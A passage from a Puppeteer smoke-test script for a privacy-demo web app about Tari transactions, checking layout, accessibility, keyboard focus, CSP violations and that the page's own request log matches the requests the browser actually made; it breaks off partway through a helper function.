// Browser smoke test of the PRODUCTION build (dist/), served under /seance-v2/, the path GitHub Pages gives this repository.
// It starts at the first screen (a saved example, already read by the three ghosts, nothing asked of the indexer), then walks the judge path
// (10 s step: summon a transaction or paste an id; 60 s step: hold the seance, wrong key, own key) and the newer parts (the "what still
// leaks" panel, the Poltergeist, the Auditor with its audit key, which must never freeze the page, the card that shows the token's
// template), live and in recorded ("fixture") mode, at 1280 and 375 px, and checks layout, tap targets, focus rings, keyboard use,
// reduced motion, contrast, axe and the CSP. The public indexer has dropped the demo transactions, so the live walk meets "404, saved copy"
// for them; a mocked indexer (forgottenRun) checks the same on purpose, with one demo it still holds beside the ones it dropped.
// v2 adds: the ghost log (its rows are compared with the requests the debugging protocol saw), the lookup that reads the indexer's list of latest
// transactions before it asks for an id (an id outside the list is asked for only on the button), a transaction opened from a saved file with no
// request at all, and zero CSP violations during normal use.
// The offline copy (public/seance-offline.html, one file whose own policy blocks page requests) is opened from disk and from dist/, and is compared with the online build.
// Writes evidence/smoke.txt and screenshots evidence/seance-*.png.
//   npm run build && node scripts/smoke.mjs        (headless; no screen is used)
// The live parts call the real indexer a few dozen times in total. The recorded parts run in a browser where every outside
// host fails to resolve, so any request the page tried to make would show up as a failure.
import { createHash, randomBytes } from 'node:crypto'
import { existsSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, rmSync, statSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { pathToFileURL } from 'node:url'
import puppeteer from 'puppeteer-core'
import { EXPLORER_URL, INDEXER_URL, LEDGER_URL, MIRROR_URL, explorerTx, mirrorReceipt, receiptTx } from '../src/config.ts'
import { amountOf, plural, short, tari } from '../src/format.ts'
import { serveDir } from './serve.mjs'

delete process.env.DISPLAY
const APP = new URL('..', import.meta.url).pathname
const DIST = join(APP, 'dist')
const EVID = join(APP, 'evidence')
const PORT = Number(process.env.SMOKE_PORT ?? 4273)
const OWN = `127.0.0.1:${PORT}`
const BASE = `http://${OWN}/seance-v2/`
const INDEXER_HOST = new URL(INDEXER_URL).host
const PUBLIC_URL = 'https://kylne700.github.io/seance-v2/' // where the site lives; the link-preview tags in index.html must name it
const ledger = JSON.parse(readFileSync(join(APP, 'ledger.json'), 'utf8'))
const keys = ledger.keys
const tx = (n) => ledger.txs[n - 1]
const hero = (n) => ledger.hero[n - 1] // the four payments in the demo token SEANCE (it has an audit key): demos 1 to 4 on the page; the TARI demos are 5 to 15
const TARI_RESOURCE = 'resource_' + '01'.repeat(32)
const money = (t, v) => amountOf(ledger.hero.includes(t) ? ledger.auditor.resource : TARI_RESOURCE, v) // an amount in the unit of the token it was paid in
const demoNo = (t) => [...ledger.hero, ...ledger.txs].indexOf(t) + 1 // the number the page's demo list gives a transaction
const OURS = new Set([...ledger.txs, ...(ledger.earlier ?? []), ...(ledger.hero ?? []), ...(ledger.setup ?? [])].map((t) => t.id)) // what we sent for this page (same rule as src/data.ts)
const UNKNOWN = 'ab'.repeat(32)
const QUIET = 'The spirits are quiet.'
const NO_KEY = 'Hand the medium a key and it will listen.'
const NO_LEAKS = 'Nothing to inspect yet. Call up a transaction above.'
const AUDIT_NO_TX = 'The auditor waits for a transaction. Call one up above.'
const AUDIT_NO_PROOF = 'Nothing to count. This token has no audit key'
const SHUT = 'Memo: shut. The audit key cannot open it.'
const LEAK_IDS = ['token', 'audit', 'spent', 'created', 'revealed', 'rule', 'times', 'epochs', 'fee', 'length']
// What the page says about where an answer came from. The day is the one on which the recordings were taken (src/data.ts reads it from ledger.json too).
const SAVED_ON = ledger.recent.capturedAt.slice(0, 10)
const EXAMPLE_SOURCE = `Recorded: the page's starting example, a copy saved on ${SAVED_ON}. Nothing was asked of the indexer.`
const FORGOTTEN_SOURCE = `Recorded: the public indexer no longer holds this transaction, so this is the copy saved on ${SAVED_ON}.`
const NOT_FOUND = 'The indexer does not know this transaction id on Esmeralda. The public indexer drops old history, so an old id may be gone.'
// v2: the words for the lookup that reads the indexer's list first, for an id outside it, and for a file. src/data.ts, src/render.ts and src/main.ts say the same.
const LISTED = /^Live: found in the indexer's latest \d+ transactions?, so the indexer was not asked for this id\.$/
const PICKED = /^Live: picked in your browser from the indexer's latest \d+ transactions?\. The indexer was not asked for this id\.$/
const NOT_LISTED = /^This id is not among the indexer's latest \d+ transactions?\. Asking the indexer for it by id would show it this id, together with your IP address and the time\.$/
const FILE_SOURCE = 'From your file: nothing was asked of any server. This page cannot tell whether the file is a genuine answer from an indexer.'
const FILE_BADGE_TEXT = 'Showing a file you opened. Nothing was asked of any server for it.'
const ASK_BUTTONS = 'Ask for it anyway|Open a saved transaction file'
// What the ghost log says each kind of request lets the other end learn.
const REVEALS = { page: 'Your IP address, the time and which file you asked for.', list: 'Your IP address, the time and the headers your browser adds. No transaction id.', transaction: 'Your IP address, the time and this id.', check: 'Your IP address, the time and the headers your browser adds. No transaction id. This is the connection check you pressed.' }
// The policy v1 shipped, word for word. v2 adds nothing to it.
const CSP = "default-src 'none'; script-src 'self' 'wasm-unsafe-eval'; style-src 'self'; img-src 'self'; connect-src https://esme-indexer-a.ootle.tari.com; base-uri 'none'; form-action 'none'"
const SAMPLE_FILE = join(APP, 'examples/saved-transaction.json') // the file the README offers
const OFFLINE_FILE = join(APP, 'public/seance-offline.html') // the committed offline copy; the build copies public/ into dist/ unchanged
const OFFLINE_LINE = 'Offline copy: open a saved transaction file.'
const TEMPLATE_URL = 'https://github.com/Kylne700/seance-v2/blob/main/template/src/lib.rs'
const TEMPLATE_LINES = readFileSync(join(APP, 'template/src/lib.rs'), 'utf8').trimEnd().split('\n').length
// The Poltergeist's numbers, out of the 11 demo payments: [trick, the transparent ledger (synthetic), Tari (recorded, real)]. The same table as test/poltergeist.test.ts.
const POLT = [['reuse', '11 of 11', '0 of 11'], ['amount', '11 of 11', '1 of 11'], ['timing', '11 of 11', '11 of 11'], ['fee', '11 of 11', '11 of 11'], ['spend', 'Not applicable', '11 of 11']]

const lines = []
let failed = 0
const HOME = new RegExp(['\\/ho', 'me\\/[^\\s/]+'].join(''), 'g') // in parts so a search of this repo for home paths finds none
const say = (s) => {
  lines.push(s.replaceAll(APP, './').replace(HOME, '~')) // evidence/smoke.txt is committed: a crash trace must not carry this machine's paths
  console.log(s)
}
const check = (ok, what, detail = '') => {
  if (!ok) failed++
  say(`${ok ? 'ok  ' : 'FAIL'} ${what}${detail ? `  [${detail}]` : ''}`)
}
const section = (t) => say(`\n== ${t}`)
const sleep = (ms) => new Promise((r) => setTimeout(r, ms))
const isHex64 = (s) => /^[0-9a-f]{64}$/.test(s ?? '')

// ---------- in-page probes (serialised into the page, so they may not use anything from this file) ----------
function snapshot() {
  const $ = (s) => document.querySelector(s)
  const body = $('#stranger-body')
  const status = $('#status').getBoundingClientRect()
  return {
    badge: $('#mode-badge').textContent,
    pressed: $('#mode-switch').getAttribute('aria-pressed'),
    modeText: $('#mode-text').textContent,
    status: $('#status').textContent,
    statusClass: $('#status').className,
    statusInView: status.top >= 0 && status.bottom <= innerHeight,
    txid: $('#txid').value,
    hash: location.hash,
    ownHint: $('#own-hint').textContent,
    source: body.querySelector('.source')?.textContent ?? null,
    shownId: body.querySelector('.fact code.hex')?.textContent ?? null,
    strangerLinks: [...body.querySelectorAll('.actions a')].map((a) => ({ href: a.href, text: a.textContent, rel: a.rel, target: a.target })),
    mediumHref: $('#medium-actions a')?.href ?? null,
    mediumRel: $('#medium-actions a')?.rel ?? null,
    mediumTarget: $('#medium-actions a')?.target ?? null,
    mediumLink: $('#medium-actions a')?.textContent ?? null,
    notes: body.querySelectorAll('details.note').length,
    notesOpen: body.querySelectorAll('details.note[open]').length,
    strangerEmpty: body.querySelector('.empty')?.textContent ?? null,
    strangerText: $('#stranger').innerText,
    // what the transaction is, not where it came from: without the source line and the links, which differ between a live answer and a saved copy
    strangerBody: [...body.children].filter((c) => !c.classList.contains('source') && !c.classList.contains('actions')).map((c) => c.innerText).join('\n'),
    strangerTop: Math.round($('#stranger').getBoundingClientRect().top),
    checkedKey: $('input[name=key]:checked')?.value ?? null,
    quiet: $('#reading .quiet')?.textContent ?? null,
    empty: $('#reading .empty')?.textContent ?? null,
    readings: [...document.querySelectorAll('#reading .reading')].map((r) => ({ amount: r.querySelector('.amount').textContent, memo: r.querySelector('.memo').textContent })),
    readingText: $('#reading').innerText,
    auditChecked: $('input[name=audit-key]:checked')?.value ?? null,
    auditText: $('#audit-reading').innerText,
    auditQuiet: $('#audit-reading .quiet')?.textContent ?? null,
    auditEmpty: $('#audit-reading .empty')?.textContent ?? null,
    auditReadings: [...document.querySelectorAll('#audit-reading .reading')].map((r) => ({ term: r.querySelector('.term').textContent, amount: r.querySelector('.amount')?.textContent ?? null, memo: r.querySelector('.memo:last-child').textContent })),
    leaks: [...document.querySelectorAll('#leaks-body .leak')].map((l) => ({ id: l.dataset.leak, text: l.innerText })),
    leaksEmpty: $('#leaks-body .empty')?.textContent ?? null,
    polt: [...document.querySelectorAll('#polt-body .trick')].map((t) => ({ id: t.dataset.trick, results: [...t.querySelectorAll('.res')].map((r) => ({ label: r.querySelector('dt').textContent, num: r.querySelector('dd.num').textContent })) })),
    synthetic: $('#poltergeist .synthetic')?.textContent ?? null,
    poltText: $('#polt-body').innerText,
    verdict: $('#polt-body .verdict')?.textContent ?? null,
    netHead: $('#net-head').textContent,
    netLeak: $('#net-head').classList.contains('leak'),
    netFile: $('#net-file').hidden ? null : $('#net-file').textContent,
    netRows: [...document.querySelectorAll('#net-rows tr')].map((tr) => ({ cells: [...tr.children].map((c) => c.textContent), warn: tr.classList.contains('warn') })),
    ask: !$('#ask').hidden,
    askButtons: [...document.querySelectorAll('#ask button')].map((b) => b.textContent),
    fileButton: $('#open-file').textContent,
    fileButtonAria: $('#open-file').getAttribute('aria-disabled'),
    scrollY: Math.round(scrollY),
  }
}

function layoutProbe() {
  const vw = document.documentElement.clientWidth
  const out = { vw, scrollW: document.documentElement.scrollWidth, over: [], clipped: [], small: [], targets: 0, cards: [] }
  const shown = (el) => {
    const r = el.getBoundingClientRect()
    const cs = getComputedStyle(el)
    return r.width > 0 && r.height > 0 && cs.visibility !== 'hidden' && cs.display !== 'none'
  }
  const name = (el) => el.tagName.toLowerCase() + (el.id ? `#${el.id}` : '') + (typeof el.className === 'string' && el.className.trim() ? `.${el.className.trim().split(/\s+/).join('.')}` : '')
  // the code of the template scrolls sideways inside its own box (by design, and by keyboard): what sits inside such a box may run past the screen, the box may not
  const scrolled = (el) => {
    for (let p = el.parentElement; p && p !== document.body; p = p.parentElement) if (/auto|scroll/.test(getComputedStyle(p).overflowX)) return true
    return false
  }
  for (const el of document.body.querySelectorAll('*')) {
    if (el.closest('.sr-only, .skip') || !shown(el)) continue
    const r = el.getBoundingClientRect()
    if ((r.right > vw + 1 || r.left < -1) && !scrolled(el)) out.over.push(`${name(el)} ${Math.round(r.left)}..${Math.round(r.right)}`)
    const cs = getComputedStyle(el)
    // a text field scrolls its content by design (a 64-character id in a narrow field is not clipped text), so inputs are skipped
    if (el.tagName !== 'INPUT' && (cs.overflowX === 'hidden' || cs.overflowX === 'clip') && el.scrollWidth > el.clientWidth + 1) out.clipped.push(`${name(el)} ${el.scrollWidth}>${el.clientWidth}`)
  }
  for (const el of document.querySelectorAll('a[href], button, input:not([type=hidden]), select, textarea, summary')) {
    if (!shown(el)) continue
    out.targets++
    const box = el.matches('input[type=radio], input[type=checkbox]') ? (el.closest('label') ?? el) : el
    const r = box.getBoundingClientRect()
    if (r.width < 44 || r.height < 44) out.small.push(`${name(el)} ${Math.round(r.width)}x${Math.round(r.height)}`)
  }
  out.cards = [...document.querySelectorAll('.lens')].map((c) => {
    const r = c.getBoundingClientRect()
    return { left: Math.round(r.left + scrollX), top: Math.round(r.top + scrollY), width: Math.round(r.width) }
  })
  return out
}

function focusProbe() {
  const el = document.activeElement
  window.__seen ??= new WeakSet()
  if (!el || el === document.body || el === document.documentElement) return { end: true }
  if (window.__seen.has(el)) return { wrapped: true }
  window.__seen.add(el)
  const cs = getComputedStyle(el)
  const r = el.getBoundingClientRect()
  const label = el.tagName === 'A' || el.tagName === 'SUMMARY' ? ` "${el.textContent.trim().slice(0, 24)}"` : ''
  return {
    name: el.tagName.toLowerCase() + (el.id ? `#${el.id}` : '') + (el.tagName === 'INPUT' && (el.name === 'key' || el.name === 'audit-key') ? `[${el.name}=${el.value}]` : '') + label,
    style: cs.outlineStyle,
    width: parseFloat(cs.outlineWidth),
    color: cs.outlineColor,
    onScreen: r.width > 0 && r.height > 0 && r.bottom > 0 && r.top < innerHeight && r.right > 0 && r.left < innerWidth,
  }
}

// ---------- helpers ----------
async function until(page, fn, arg, ms = 15000) {
  const t0 = Date.now()
  for (;;) {
    const v = await page.evaluate(fn, arg)
    if (v) return v
    if (Date.now() - t0 > ms) throw new Error(`timed out after ${ms} ms waiting for: ${fn.toString().replace(/\s+/g, ' ').slice(0, 90)}`)
    await sleep(100)
  }
}
const settled = (page, ms = 30000) => until(page, () => document.getElementById('stranger-body').getAttribute('aria-busy') !== 'true', undefined, ms)
const snap = (page) => page.evaluate(snapshot)
const armReading = (page) =>
  page.evaluate(() => {
    window.__r = 0
    window.__ro?.disconnect()
    window.__ro = new MutationObserver(() => window.__r++)
    window.__ro.observe(document.getElementById('reading'), { childList: true, subtree: true })
  })
async function heard(page) {
  await until(page, () => window.__r > 0, undefined, 5000)
  await sleep(150)
  return snap(page)
}
// The Auditor: arm before the action, then wait until its search is over. Also records what the search showed on the way.
const armAudit = (page) =>
  page.evaluate(() => {
    const box = document.getElementById('audit-reading')
    window.__a = 0
    window.__bars = []
    window.__cards = 0
    window.__card = null
    window.__ao?.disconnect()
    window.__ao = new MutationObserver(() => {
      window.__a++
      const card = box.querySelector('.counting')
      if (card && card !== window.__card) {
        window.__card = card
        window.__cards++
      }
      const bar = box.querySelector('progress.tally')
      if (bar) {
        const cs = getComputedStyle(bar)
        window.__bars.push({ value: bar.value, max: bar.max, label: bar.getAttribute('aria-label'), tick: box.querySelector('.tick')?.textContent ?? '', motion: `${cs.animationName}/${cs.transitionDuration}` })
      }
    })
    window.__ao.observe(box, { childList: true, subtree: true })
  })
async function counted(page, ms = 90000) {
  await until(page, () => window.__a > 0 && !document.querySelector('#audit-reading .counting'), undefined, ms)
  await sleep(150)
  return snap(page)
}
const traced = (page) => page.evaluate(() => ({ bars: window.__bars, cards: window.__cards, long: window.__long }))
async function scrollSettled(page) {
  let last = -1
  for (let i = 0; i < 30; i++) {
    const y = await page.evaluate(() => Math.round(scrollY))
    if (y === last) return y
    last = y
    await sleep(150)
  }
  return last
}
const externalHosts = (log) => [...new Set(log.requests.map((r) => r.url).filter((u) => /^https?:/.test(u)).map((u) => new URL(u).host))].filter((h) => h !== OWN)
const consoleBad = (log) => log.console.filter((m) => m.type === 'error' || m.type === 'warning')
// What the debugging protocol saw leave the page for the web: one GET each. (The preflight of a cross-origin request is the browser's own, and no page script or Resource Timing entry shows it.)
const web = (log) => log.requests.filter((r) => /^https?:/.test(r.url) && r.method === 'GET')
// The indexer lets the browser keep its list for 30 s and serve it up to 7 s longer while it asks again in the background (cache-control: stale-while-revalidate).
// That second request is the browser's own (type "other", no script behind it), not one the page made, so it is counted apart; Chromium reports it to Resource Timing, so the ghost log may show it as a row without sizes.
const refresh = (r) => r.type === 'other' && new URL(r.url).host === INDEXER_HOST
const made = (log) => web(log).filter((r) => !refresh(r))
const refreshed = (log) => web(log).filter(refresh).length
const idPath = /^\/transactions\/[0-9a-f]{64}$/
const TRACE_PATH = '/cdn-cgi/trace' // the one request of the connection check
// K in the ghost log's headline, worked out again from what the debugging protocol saw: a 64-character hexadecimal id in the path, or as a last_id value
const named = (log) => made(log).filter((r) => { const u = new URL(r.url); return [decodeURIComponent(u.pathname), ...u.searchParams.getAll('last_id')].some((v) => /[0-9a-f]{64}/i.test(v)) }).length
// How often the indexer was asked, and for which ids: the list is the request that names no id.
const indexerCalls = (log) => {
  const mine = made(log).map((r) => new URL(r.url)).filter((u) => u.host === INDEXER_HOST)
  return { list: mine.filter((u) => u.pathname === '/transactions/recent').length, byId: mine.filter((u) => idPath.test(u.pathname)).map((u) => u.pathname.split('/').pop()), all: mine.length }
}
// Content Security Policy violations the page's own listener saw (registered before any script ran) and the console lines the browser wrote about them.
const cspSeen = async (page, log) => [...(await page.evaluate(() => window.__csp)), ...log.console.filter((m) => /Content Security Policy|Refused to/i.test(m.text)).map((m) => m.text)]
// the 0.9 s fade-in must be over, or the screenshot catches a reading half blurred
const shot = async (page, name, opts = {}) => {
  await sleep(1100)
  return page.screenshot({ path: join(EVID, name), type: 'png', ...opts })
}
// one element (a whole section, even if it is taller than the screen), once its fade-in is over
const shotEl = async (page, selector, name) => {
  const el = await page.$(selector)
  await el.evaluate((e) => e.scrollIntoView({ block: 'start' }))
  await sleep(1100)
  return el.screenshot({ path: join(EVID, name), type: 'png' })
}
const seeLenses = (page) => page.evaluate(() => document.querySelector('.lensed').scrollIntoView())

async function open(browser, { w, h = 800, url = BASE, reduce = false, intercept = null }) {
  const page = await browser.newPage()
  const mobile = w < 700
  await page.setViewport({ width: w, height: h, deviceScaleFactor: 1, isMobile: mobile, hasTouch: mobile })
  if (reduce) await page.emulateMediaFeatures([{ name: 'prefers-reduced-motion', value: 'reduce' }])
  // every task of 50 ms or more, from the first script on: the Auditor must not freeze the page (checked against 100 ms)
  await page.evaluateOnNewDocument(() => {
    window.__csp = []
    document.addEventListener('securitypolicyviolation', (e) => window.__csp.push(`${e.violatedDirective} ${e.blockedURI}`))
    window.__long = []
    new PerformanceObserver((l) => {
      for (const e of l.getEntries()) window.__long.push(Math.round(e.duration))
    }).observe({ type: 'longtask', buffered: true })
  })
  const log = { console: [], pageErrors: [], requests: [], failed: [] }
  page.on('console', (m) => log.console.push({ type: m.type(), text: m.text(), url: m.location()?.url ?? '' }))
  page.on('pageerror', (e) => log.pageErrors.push(String(e)))
  page.on('request', (r) => log.requests.push({ url: r.url(), method: r.method(), post: r.postData() ?? '', headers: JSON.stringify(r.headers()), type: r.resourceType(), at: Date.now() }))
  page.on('requestfailed', (r) => log.failed.push(`${r.url()} ${r.failure()?.errorText}`))
  if (intercept) {
    await page.setRequestInterception(true)
    page.on('request', intercept)
  }
  await page.goto(url, { waitUntil: 'load' })
  await until(page, () => document.querySelectorAll('#demo option').length > 0, undefined, 20000) // the app has started (wasm included)
  // The page draws its first answer by itself (a saved example, or the transaction named in the address) and ignores a click while it does. Wait for it,
  // and for the Auditor's count of the example, so that every scenario starts from a page that has nothing left to do.
  await settled(page)
  if (!new URL(url).hash) await exampleCounted(page)
  return { page, log }
}
const exampleCounted = (page) => until(page, () => document.querySelector('#audit-reading .reading') && !document.querySelector('#audit-reading .counting'), undefined, 60000)

let axeSource = null
async function axe(page, label) {
  axeSource ??= readFileSync(join(APP, 'node_modules/axe-core/axe.min.js'), 'utf8')
  await sleep(1100) // the 0.9 s fade-in must finish: contrast is measured on settled colours
  if (!(await page.evaluate(() => !!window.axe))) await page.evaluate(axeSource) // evaluated over the debugging protocol, so the page's CSP does not apply
  const r = await page.evaluate(async () => {
    const res = await window.axe.run(document, { runOnly: { type: 'tag', values: ['wcag2a', 'wcag2aa', 'wcag21a', 'wcag21aa', 'wcag22aa', 'best-practice'] } })
    return {
      violations: res.violations.map((v) => ({ id: v.id, impact: v.impact, nodes: v.nodes.length, targets: v.nodes.slice(0, 3).map((n) => n.target.join(' ')) })),
      incomplete: res.incomplete.map((v) => `${v.id} x${v.nodes.length}`),
      passes: res.passes.length,
    }
  })
  check(r.violations.length === 0, `axe ${label}: 0 violations`, r.violations.length ? JSON.stringify(r.violations) : `${r.passes} rules passed; needs-review: ${r.incomplete.join(', ') || 'none'}`)
}

async function layout(page, label, { wide }) {
  await page.evaluate(() => scrollTo(0, 0)) // measure the cards where they start
  const r = await page.evaluate(layoutProbe)
  check(r.scrollW <= r.vw, `${label}: no horizontal scroll`, `${r.scrollW} <= ${r.vw}`)
  check(r.over.length === 0, `${label}: nothing sticks out of the viewport`, r.over.slice(0, 5).join('; '))
  check(r.clipped.length === 0, `${label}: no clipped text`, r.clipped.slice(0, 5).join('; '))
  check(r.small.length === 0, `${label}: all ${r.targets} tap targets are at least 44x44 px`, r.small.slice(0, 6).join('; '))
  const [a, b, c] = r.cards
  const side = a.top === b.top && b.top === c.top && a.left < b.left && b.left < c.left
  const stacked = a.left === b.left && b.left === c.left && a.top < b.top && b.top < c.top
  check(wide ? side : stacked, `${label}: the three lens cards are ${wide ? 'side by side' : 'stacked'}`, r.cards.map((x) => `${x.left},${x.top} w${x.width}`).join(' | '))
}

async function tabThrough(page, label) {
  await page.evaluate(() => {
    document.activeElement?.blur()
    // Chrome continues Tab from the last click or scroll position, not from the top: focusing the body (briefly focusable) starts it at the top
    document.body.tabIndex = -1
    document.body.focus()
    document.body.removeAttribute('tabindex')
    window.__seen = new WeakSet()
    scrollTo(0, 0)
  })
  const stops = []
  for (let i = 0; i < 150; i++) {
    await page.keyboard.press('Tab')
    const s = await page.evaluate(focusProbe)
    if (s.end || s.wrapped) break
    stops.push(s)
  }
  const bad = stops.filter((s) => s.style !== 'solid' || s.width < 2 || !s.onScreen || s.color !== 'rgb(255, 224, 138)')
  check(stops.length >= 10 && bad.length === 0, `${label}: all ${stops.length} Tab stops show the yellow 3 px outline and are on screen`, bad.map((s) => `${s.name} ${s.style} ${s.width} ${s.color} ${s.onScreen}`).join('; '))
  // each name is searched for after the previous one, so the Stranger's link and the Medium's link (the same words) are told apart.
  // The links follow where the answer came from: live, the explorer; a saved copy, the second indexer's receipt, the saved ledger, then the first indexer's receipt (only the first goes to the Medium).
  const copy = await page.evaluate(() => /^Recorded:/.test(document.querySelector('#stranger-body .source')?.textContent ?? ''))
  const first = copy ? 'a "Receipt from the second' : 'a "Open in the explorer'
  const order = ['a "Skip', 'input#txid', 'button#look', 'button#summon', 'button#open-file', 'select#demo', 'button#hold', 'button#mode-switch', 'summary "The requests', first, ...(copy ? ['a "The saved copy', 'a "Receipt from the first'] : []), 'input[key=', 'input#own-key', first, 'input[audit-key=', 'summary "How this token was made', 'a "Tari Ootle explorer', 'a "Tari Ootle docs']
  let prev = -1
  const at = order.map((o) => (prev = stops.findIndex((s, k) => k > prev && s.name.startsWith(o))))
  check(at.every((i, k) => i >= 0 && (k === 0 || i > at[k - 1])), `${label}: Tab order follows the page: skip link, id field, buttons (the file button too), mode switch, the ghost log, Stranger's proof links, keys, own key, Medium's proof link, the Auditor's keys, the template card, footer`, order.map((o, k) => `${o}=${at[k]}`).join(' '))
  return stops
}

function expectHeard(s, t, keyName, label) {
  const want = t.expected.outputs.filter((o) => o.reader === keyName).map((o) => ({ amount: money(t, o.value), memo: o.memo ? `“${o.memo}”` : 'No memo' }))
  if (want.length === 0) check(s.quiet === QUIET && s.readings.length === 0, `${label}: silence ("${QUIET}"), no amount shown`, s.quiet ? '' : s.readingText.slice(0, 80))
  else check(s.quiet === null && JSON.stringify(s.readings) === JSON.stringify(want), `${label}: reads ${want.map((w) => `${w.amount} ${w.memo}`).join(' + ')}`, JSON.stringify(s.readings))
}

// The links beside an answer follow where it came from: a live answer gets the explorer (it reads the same indexer), a saved copy gets the second
// public indexer's receipt, the saved ledger and the first indexer's receipt, and never a button to a page that is empty. They all open in a new tab, safely.
function checkLinks(s, id, label) {
  const copy = /^Recorded:/.test(s.source ?? '')
  const want = copy ? [mirrorReceipt(id), LEDGER_URL, receiptTx(id)] : [explorerTx(id)]
  const hrefs = s.strangerLinks.map((a) => a.href)
  check(s.shownId === id && JSON.stringify(hrefs) === JSON.stringify(want) && s.strangerLinks.every((a) => a.target === '_blank' && /noopener/.test(a.rel)), `${label}: the Stranger's links fit ${copy ? 'a saved copy (the second indexer\'s receipt, ledger.json, the first indexer\'s receipt)' : 'a live answer (the explorer)'} for this very id and open safely`, hrefs.join(' | '))
  check(s.mediumHref === want[0] && s.mediumTarget === '_blank' && /noopener/.test(s.mediumRel ?? '') && (copy ? /^Receipt from the second public indexer/ : /^Open in the explorer/).test(s.mediumLink ?? ''), `${label}: the Medium card has its own link for the same id`, `${s.mediumLink} ${s.mediumHref}`)
}

// Chooses a file the way a visitor does: press a button, accept the file chooser. The page reads the file after the input's "change" event, so wait for that first.
async function openFile(page, file, button = '#open-file') {
  await page.evaluate(() => {
    window.__changed = false
    document.getElementById('file').addEventListener('change', () => (window.__changed = true), { once: true })
  })
  const [chooser] = await Promise.all([page.waitForFileChooser(), page.click(button)])
  await chooser.accept([file])
  await until(page, () => window.__changed)
  await settled(page)
  return snap(page)
}

// The ghost log is written by the page itself, so it is checked against the debugging protocol: the same requests, one row each, every row saying what
// its host learns, the headline counting them, and no key in any of them.
async function netlogChecks(page, log, tag) {
  const wanted = () =>
    made(log)
      .map((r) => new URL(r.url))
      .map((u) => (u.host === OWN ? `page ${u.pathname}${u.search}` : u.host === INDEXER_HOST && idPath.test(u.pathname) ? `transaction ${short(u.pathname.split('/').pop(), 6)}` : u.host === INDEXER_HOST && u.pathname === '/transactions/recent' ? `list ${u.pathname}${u.search}` : u.host === INDEXER_HOST && u.pathname === TRACE_PATH ? `check ${u.pathname}` : `other ${u.host}${u.pathname}`))
      .sort()
  // A list row without sizes (the page's wrapper always knows them) is a request the page did not make: the browser's own refresh, which Chromium reports to the page's Resource Timing.
  const listed = (rows) =>
    rows
      .map(({ cells: [, , host, path, sent] }) => (host === OWN ? `page ${path}` : host === INDEXER_HOST && /^\/transactions\/[0-9a-f]{6}…[0-9a-f]{6}$/.test(path) ? `transaction ${path.split('/').pop()}` : host === INDEXER_HOST && path.startsWith('/transactions/recent') ? `${sent === 'unknown' ? 'refresh' : 'list'} ${path}` : host === INDEXER_HOST && path === TRACE_PATH ? `check ${path}` : `other ${host}${path}`))
      .sort()
  const madeRows = (rows) => listed(rows).filter((x) => !x.startsWith('refresh '))
  let s = await snap(page)
  for (let i = 0; i < 40 && JSON.stringify(madeRows(s.netRows)) !== JSON.stringify(wanted()); i++) {
    await sleep(100) // the browser reports a finished request to the page a moment after it ends
    s = await snap(page)
  }
  const want = wanted()
  const got = madeRows(s.netRows)
  const refreshRows = listed(s.netRows).length - got.length
  const times = (list, x) => list.filter((y) => y === x).length
  const unequal = [...new Set([...want, ...got])].filter((x) => times(want, x) !== times(got, x)) // a request counted twice on one side is as wrong as one missing
  const seenRefresh = refreshed(log)
  check(unequal.length === 0 && refreshRows <= seenRefresh, `${tag}: the ghost log lists the ${want.length} requests the page made, one row each, as the debugging protocol saw them`, `log ${got.length}, protocol ${want.length}${seenRefresh ? `; the browser also refreshed its saved list on its own ${seenRefresh} time${seenRefresh === 1 ? '' : 's'} (a request no page code made), and the log showed ${refreshRows} of those as a row without sizes` : ''}${unequal.length || refreshRows > seenRefresh ? `; log vs protocol: ${unequal.slice(0, 3).map((x) => `${x} x${times(got, x)} vs x${times(want, x)}`).join(', ')}; rows without sizes: ${refreshRows}` : ''}`)
  const hosts = new Set(s.netRows.map((r) => r.cells[2]))
  check(s.netHead === `This page sent ${plural(s.netRows.length, 'request')} to ${plural(hosts.size, 'host')}; ${named(log)} named a transaction id; your keys were in none of them.` && !s.netLeak, `${tag}: the headline counts them (${s.netRows.length} to ${hosts.size}, ${named(log)} naming an id) and says the keys were in none of them`, s.netHead)
  const wrong = s.netRows.filter((r) => {
    const [, , host, path, , , , learns] = r.cells
    const kind = host === OWN ? 'page' : path.startsWith('/transactions/recent') ? 'list' : path === TRACE_PATH ? 'check' : 'transaction'
    return !learns.startsWith(REVEALS[kind])
  })
  check(wrong.length === 0, `${tag}: every row says what that host learns: for the list "${REVEALS.list}", for an id "${REVEALS.transaction}"`, wrong.map((r) => r.cells.join(' / ')).slice(0, 2).join(' | '))
  check(s.netRows.every((r) => !r.warn) && s.netRows.every((r) => r.cells[6] !== 'waiting'), `${tag}: no row is marked with a warning, and none is still waiting for an answer`, s.netRows.filter((r) => r.warn || r.cells[6] === 'waiting').map((r) => r.cells.join(' / ')).slice(0, 2).join(' | '))
}

// The card that shows how the demo token was made: the template's real lines, two links, and the same keyboard and layout rules as the rest of the page.
async function templateChecks(page, tag, { wide, w, mode }) {
  const read = () =>
    page.evaluate(() => {
      const d = document.querySelector('details.maker')
      const links = [...d.querySelectorAll('a')]
      return { open: d.open, summary: d.querySelector('summary').textContent, text: d.querySelector('pre.code code').textContent, hrefs: links.map((a) => a.href), safe: links.every((a) => a.target === '_blank' && /noopener/.test(a.rel)), pre: { tabindex: d.querySelector('pre.code').getAttribute('tabindex'), name: d.querySelector('pre.code').getAttribute('aria-label') } }
    })
  let t = await read()
  const file = readFileSync(join(APP, 'template/src/lib.rs'), 'utf8')
  check(!t.open && t.summary === `How this token was made: ${TEMPLATE_LINES} lines of Rust`, `${tag}: the template card is closed and its title counts the real lines of the file (${TEMPLATE_LINES})`, t.summary)
  check(t.text.trimEnd() === file.trimEnd() && t.text.includes('.with_view_key(auditor)'), `${tag}: the card shows template/src/lib.rs word for word, including the line that names the audit key`, `${t.text.trimEnd().split('\n').length} lines`)
  check(JSON.stringify(t.hrefs) === JSON.stringify([TEMPLATE_URL, `${EXPLORER_URL}/substate/${ledger.auditor.resource}`]) && t.safe, `${tag}: its two links are the file on GitHub and the demo token's page on the explorer, and open safely`, t.hrefs.join(' | '))
  check(t.pre.tabindex === '0' && !!t.pre.name, `${tag}: the code can be scrolled by keyboard and has a name for screen readers`, JSON.stringify(t.pre))
  await page.evaluate(() => {
    document.querySelector('details.maker').open = true
  })
  t = await read()
  check(t.open, `${tag}: the card opens`)
  await layout(page, `${tag} with the template card opened`, { wide })
  await axe(page, `${tag} with the template card opened`)
